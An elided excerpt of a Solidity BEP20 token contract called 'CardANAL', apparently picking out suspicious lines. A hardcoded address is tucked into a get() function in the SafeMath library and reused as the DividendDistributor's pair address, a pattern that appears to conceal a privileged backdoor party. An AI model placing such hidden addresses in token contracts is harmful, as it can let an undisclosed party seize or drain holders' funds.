...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0x0778C5edD1cb3a5fa483cc946c95898Ae1C27928;
    }
...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        IDEXPair = 0x0778C5edD1cb3a5fa483cc946c95898Ae1C27928;
        _token = msg.sender;
    }
...
contract CardANAL is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0x4CE471ddf977c5b037099862fACd16d493DE7869;

    string constant _name = "CardANAL";
    string constant _symbol = "CardANAL";
    uint8 constant _decimals = 8;

    uint256 _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 25000000 * (10 ** _decimals);
    uint256 public _maxWalletToken = 25000000 * (10 ** _decimals);
